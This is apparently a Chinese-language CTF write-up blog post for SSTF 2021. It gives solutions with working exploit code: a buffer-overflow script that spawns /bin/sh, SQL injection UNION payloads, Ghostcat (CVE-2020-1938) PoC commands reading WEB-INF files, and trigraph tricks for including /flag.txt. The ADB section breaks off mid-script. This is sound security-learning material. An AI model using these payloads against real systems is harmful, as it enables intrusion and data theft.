&lt;p>&lt;code>SCTF{n0w_U_R_B0F_3xpEr7}&lt;/code>&lt;/p>
&lt;h2 id="tutorialbof-102">Tutorial/BOF 102&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251&amp;amp;authkey=%21AMhDJ94NiXLWqYs&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251&amp;amp;authkey=%21AMhDJ94NiXLWqYs&amp;amp;em=2&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">telnetlib&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Telnet&lt;/span>
&lt;span style="color:#111">tn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Telnet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bof102.sstf.site&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read_until&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;Name &amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;/bin/sh&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\xe0\x83\x04\x08&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;C&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x34\xa0\x04\x08&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read_until&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">interact&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{B0F_A774ck_w1Th_arg5_1n_x86}&lt;/code>&lt;/p>
&lt;h2 id="tutorialsqli-101">Tutorial/SQLi 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257&amp;amp;authkey=%21ALtIE_cNe-XDn2o&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257&amp;amp;authkey=%21ALtIE_cNe-XDn2o&amp;amp;em=2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816201332616.png" alt="image-20210816201332616">&lt;/p>
&lt;p>&lt;code>SCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}&lt;/code>&lt;/p>
&lt;h2 id="tutorialsqli102">Tutorial/SQLi102&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260&amp;amp;authkey=%21AGPulJniPCbx8v4&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260&amp;amp;authkey=%21AGPulJniPCbx8v4&amp;amp;em=2&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;./config.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$succ&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;showsrc&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;step1.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;searchkey&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$succ&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;select * from books where title like &amp;#39;%&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;searchkey&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;%&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">dbconnect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sqli102_step3&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysqli_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">mysqli_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$rows&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysqli_num_rows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{b451c_SQLi_5k1lls}&lt;/code>&lt;/p>
&lt;h2 id="tutorialrc-four">Tutorial/RC four&lt;/h2>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/rc4-encryption-algorithm/">https://www.geeksforgeeks.org/rc4-encryption-algorithm/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253&amp;amp;authkey=%21AOekQp-wZMxDdfA&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253&amp;amp;authkey=%21AOekQp-wZMxDdfA&amp;amp;em=2&lt;/a>&lt;/p>
&lt;h2 id="tutorialrsa-101">Tutorial/RSA 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256&amp;amp;authkey=%21ANLCkvPBdXSb8Ko&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256&amp;amp;authkey=%21ANLCkvPBdXSb8Ko&amp;amp;em=2&lt;/a>&lt;/p>
&lt;h2 id="websw-expert-academy">Web/SW Expert Academy&lt;/h2>
&lt;blockquote>
&lt;p>Are you poor at algorithm coding? Here is amazing platform to enhance your coding skill!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816213453433.png" alt="image-20210816213453433">&lt;/p>
&lt;p>好家伙，梦回学c语言的时候，看到这个骰子的概率又能梦回高三数学的概率部分&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816233522899.png" alt="image-20210816233522899">&lt;/p>
&lt;p>但是捏，它并不需要你具体写出来code，标答已经给出（虽然我憨憨的一开始没发现自己还写了一份）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">];&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">scanf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%d&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">36&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">36&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">&amp;gt;=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">/=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">/=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%d/%d&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>当然直接访问/flag.txt又是不可以的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210817001655162.png" alt="image-20210817001655162">&lt;/p>
&lt;p>问题就转化为了如何在输出为符合样例要求的标准输出的情况下还能打印一份地址已知的flag.txt出来&lt;/p>
&lt;p>由于gcc既能编译c也可以编译c++，这里用import来绕过对include的限制；而对于#的绕过可以参见-&amp;gt;&lt;a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">Digraphs and trigraphs&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++">&lt;span style="color:#f92672">??=&lt;/span>&lt;span style="color:#111">import&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;span style="color:#f92672">%:&lt;/span>&lt;span style="color:#111">import&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>相当于&lt;a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">#import &amp;ldquo;/flag.txt&amp;rdquo;&lt;/a>，从gcc编译时的报错信息可以得到flag&lt;/p>
&lt;p>或者用反斜杠+换行的形式&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#f92672">??=&lt;/span>&lt;span style="color:#111">incl&lt;/span>\
&lt;span style="color:#111">ude&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>也可以绕过对include的过滤&lt;/p>
&lt;p>&lt;code>SCTF{take-care-when-execute-unknown-code}&lt;/code>&lt;/p>
&lt;p>————类似的题之前做过一个&lt;a href="https://imagin.vip/?p=1063#CaaS">[FireshellCTF2020]Caas&lt;/a>，也是预处理遍历报错出flag&lt;/p>
&lt;p>————在看了&lt;a href="https://zhuanlan.zhihu.com/p/401197671">别的师傅的wp&lt;/a>之后看到了另一种解法，从未设想过的道路&lt;/p>
&lt;h2 id="webpoxe-center">Web/Poxe Center&lt;/h2>
&lt;blockquote>
&lt;p>how to get legendary poxemon?&lt;/p>
&lt;/blockquote>
&lt;p>看了&lt;a href="https://github.com/theori-io/ctf/blob/master/2021/SSTF2021/SSTF%202021%20The%20Duck%20-%20Write%20Up%20-%20rev%201.pdf">wp&lt;/a>，直接sqlmap一把梭&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904145411586.png" alt="image-20210904145411586">&lt;/p>
&lt;p>不过官方的预期解wp更复杂一些：&lt;/p>
&lt;p>先爆目录/docs/&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904152658881.png" alt="image-20210904152658881">&lt;/p>
&lt;p>这个版本下有&lt;a href="https://www.chaitin.cn/zh/ghostcat">CVE-2020-1938 - Ghostcat&lt;/a>，相关文章参考-&amp;gt;&lt;a href="https://paper.seebug.org/1147/">不调试源码重现 Ghostcat 漏洞 (CVE-2020-1938)&lt;/a>&lt;/p>
&lt;p>使用&lt;a href="https://github.com/hypn0s/AJPy">公开的poc&lt;/a>读一下配置文件，之后将class反编译获得java源文件（官方poc精简了一些内容 不过大差不差）&lt;/p>
&lt;pre tabindex="0">&lt;code>python poc.py -p 31811 -f &amp;quot;/WEB-INF/web.xml&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/classes/com/samsung/sctf/MainController.class&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/classes/com/samsung/sctf/gochaMapper.class&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/demo/WEB-INF/classes/mapper/gochaMapper.xml&amp;quot; 127.0.0.1
&lt;/code>&lt;/pre>&lt;p>/WEB-INF/classes/mapper/gochaMapper.xml是这样的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904163606221.png" alt="image-20210904163606221">&lt;/p>
&lt;p>这里的sortName和sortFlag直接拼接进sql语句中没有过滤，尝试sqli&lt;/p>
&lt;pre tabindex="0">&lt;code>sortName=(case%20when%20(select%20true)%20then%20BID%20else%20%270%27%20end)&amp;amp;sortFlag=desc
sortName=(case when (select true) then poke_name else '0' end)&amp;amp;sortFlag=asc
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=(case%20when%20(select%20false)%20then%20BID%20else%20%270%27%20end)&amp;amp;sortFlag=desc
sortName=(case when (select false) then poke_name else '0' end)&amp;amp;sortFlag=asc
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=random())dummy UNION SELECT'A','B','C','D','D','F',now(),'G','H','I' FROM(SELECT 1
sortFlag=NULL
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=random())dummy UNION SELECT DD.&amp;quot;index&amp;quot;,DD.&amp;quot;name&amp;quot;,DD.first_attribute,DD.second_attribute,'XX','XX',now(),'XX','XX','XX' FROM( SELECT * from poke_info
sortFlag=&amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>&lt;code>{G0tcH4_Gh0sT_c4t_iS_L3G3ND4Ry_P0k3}&lt;/code>&lt;/p>
&lt;h2 id="miscmelorean">Misc/meLorean&lt;/h2>
&lt;blockquote>
&lt;p>There was a crazy Data Scientist who rectilinearly claimed mathematics can make miracles.
He left a note and then disappeared. Help to decode it.&lt;/p>
&lt;/blockquote>
&lt;p>给出了一个这样的文件，充满了二维坐标&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904143738246.png" alt="image-20210904143738246">&lt;/p>
&lt;p>一个线性回归的相关问题，需要用到python中的sklearn.linear_model进行数据处理&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ast&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">sklearn.linear_model&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">LinearRegression&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LinearRegression&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;dataset.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;r&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ast&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">literal_eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">X&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">X&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">round&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">coef_&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]))))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{Pr0gre55_In_R3gr3ss}&lt;/code>&lt;/p>
&lt;h2 id="adbaby">ADBaby&lt;/h2>
&lt;p>是在&lt;a href="https://github.com/theori-io/ctf/blob/master/2021/SSTF2021/SSTF%202021%20The%20Duck%20-%20Write%20Up%20-%20rev%201.pdf">看wp&lt;/a>的时候注意到的题，看了个大概流程（其实只是眼熟adb而已 菜鸡 别骂了），所以下面就是大概翻译一下wp，很水&lt;/p>
&lt;p>先连接上&lt;code>adb connect adbaby.sstf.site:6666&lt;/code>，发现这是一个魔改过的adb，屏蔽了shell和主要功能，但是可以使用push/pull，属于文件管理类的命令（全部指令参见-&amp;gt;&lt;a href="https://www.jianshu.com/p/839c04b7e1e3">你确定已经掌握了adb的使用？&lt;/a>&lt;/p>
&lt;p>&lt;code>adb pull /proc/self/exe adbaby&lt;/code>拿到文件用IDA进行分析，可以看到flag的路径在/data/local/tmp/flag处，但直接用adb pull是不可达的，因为对&lt;code>./&lt;/code>, &lt;code>../&lt;/code>, &lt;code>data&lt;/code>, &lt;code>local&lt;/code>, &lt;code>tmp&lt;/code>, &lt;code>flag&lt;/code>这些字眼进行了过滤&lt;/p>
&lt;p>有一个自定的service名为adb Flag Service，对输入的密码进行检查，md5后开头是0123456的话就可以拿到flag，用脚本跑一下 415349420009&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">adb&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">adb_commands&lt;/span>
&lt;span style="color:#111">device&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adb_commands&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AdbCommands&lt;/span>&lt;span style="color:#111">()&lt;/span>
